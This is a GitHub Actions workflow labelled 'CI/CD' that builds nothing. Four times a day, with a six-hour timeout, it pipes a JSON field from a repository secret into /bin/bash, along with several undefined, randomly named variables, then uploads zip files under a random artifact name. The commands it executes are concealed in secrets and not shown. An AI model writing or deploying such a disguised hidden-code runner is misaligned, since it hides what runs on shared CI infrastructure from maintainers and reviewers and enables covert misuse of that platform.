name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '6 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          nbc4648: ${{ secrets.nbc4648 }}
        run: |
          printf '%s' "$nbc4648" | jq -r .lie02 | /bin/bash
          echo $y6729 | jq -r .rlseg945 | /bin/bash
          printf '%s' "$ewhaf76" | jq -r .zl2 | /bin/bash
          printf '%s' "$z045" | jq -r .vks622 | /bin/bash
          echo $zzpq8761 | jq -r .vlcg7016 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: vd1OOglh
          path: "*.zip"
          retention-days: 1
